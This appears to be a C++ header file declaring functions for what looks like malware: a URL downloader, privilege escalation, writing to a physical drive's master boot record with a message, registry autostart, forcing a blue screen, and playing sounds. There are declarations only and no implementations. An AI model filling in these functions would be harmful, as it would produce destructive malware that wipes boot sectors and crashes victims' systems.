#pragma once

#include"std.h"


std::wstring GetDataFromURL(const std::wstring& url, bool& isok);
bool DownloadFileFromURL(const std::wstring& url, const std::wstring& filepath);
bool GetPrivileges();
bool WritePhydriveMBR(unsigned int id, const std::string& msgstr);
std::string ReadPhydriveMBR(unsigned int id);
bool RegAutoStart();
bool MakeBlueScreen(unsigned int errid);
bool PlaySoundFile(const std::wstring& soundname, bool sync);